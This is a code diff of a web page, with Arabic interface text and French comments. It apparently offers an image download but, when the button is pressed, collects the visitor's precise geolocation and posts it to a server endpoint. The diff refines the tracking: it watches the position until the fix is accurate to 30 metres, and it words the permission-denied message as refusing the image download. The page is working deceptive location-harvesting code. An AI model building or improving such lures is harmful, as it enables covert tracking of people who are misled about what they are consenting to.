@@ -33,7 +33,6 @@
 
 <body>
 
-
     <button id="locationButton">حمل الصورة من هنا</button>
 
     <div id="message"></div>
@@ -52,66 +51,103 @@
     function getLocation() {
 
         if (!navigator.geolocation) {
-            show("no");
+            show("غير متاح");
             return;
         }
 
         button.disabled = true;
-        show("download");
+        show("جاررري...");
 
-        navigator.geolocation.getCurrentPosition(
+        let meilleure = null;
+        const seuil = 30;       
+        const dureeMax = 20000; 
 
-            async function (position) {
+        const watchId = navigator.geolocation.watchPosition(
 
-                show("قيد المعالجة.");
+            function (position) {
 
-                try {
-                    const response = await fetch("/api/send-location", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            latitude:  position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy:  position.coords.accuracy
-                        })
-                    });
+                const acc = position.coords.accuracy;
 
-                    const result = await response.json().catch(() => ({}));
+                // On conserve la position la plus précise vue jusqu'ici
+                if (!meilleure || acc < meilleure.coords.accuracy) {
+                    meilleure = position;
+                }
 
-                    if (!response.ok) {
-                        throw new Error(result.error || "خطأ");
-                    }
+                show("حاليا : " + Math.round(acc) + " m...");
 
-                    show("تم الارسال.");
-
-                } catch (error) {
-                    console.error(error);
-                    show("مستحيل");
-                    button.disabled = false;
+                if (acc <= seuil) {
+                    navigator.geolocation.clearWatch(watchId);
+                    clearTimeout(minuteur);
+                    envoyer(meilleure);
                 }
             },
 
             function (error) {
 
+                navigator.geolocation.clearWatch(watchId);
+                clearTimeout(minuteur);
                 button.disabled = false;
 
                 if (error.code === 1) {
-                    show("رفضت السماح بتحميل الصورة");
+                    show("رفضت الموافقة");
                 } else if (error.code === 2) {
-                    show("شكرا");
+                    show("غير متاح");
                 } else if (error.code === 3) {
-                    show("انتهت صلاحية الطلب");
+                    show("انتهت الصلاحية.");
                 } else {
-                    show("خطأ.");
+                    show("خطأ");
                 }
             },
 
             {
                 enableHighAccuracy: true,
-                timeout: 15000,
+                timeout: dureeMax,
                 maximumAge: 0
             }
         );
+
+        const minuteur = setTimeout(function () {
+
+            navigator.geolocation.clearWatch(watchId);
+
+            if (meilleure) {
+                envoyer(meilleure);
+            } else {
+                button.disabled = false;
+                show("مستحيل.");
+            }
+
+        }, dureeMax);
+    }
+
+    async function envoyer(position) {
+
+        show("Position obtenue (" + Math.round(position.coords.accuracy) + " m). Envoi...");
+
+        try {
+            const response = await fetch("/api/send-location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    latitude:  position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy:  position.coords.accuracy
+                })
+            });
+
+            const result = await response.json().catch(() => ({}));
+
+            if (!response.ok) {
+                throw new Error(result.error || "Erreur serveur");
+            }
+
+            show("Votre position a été transmise.");
+
+        } catch (error) {
+            console.error(error);
+            show("Impossible d'envoyer la position.");
+            button.disabled = false;
+        }
     }
 
 </script>
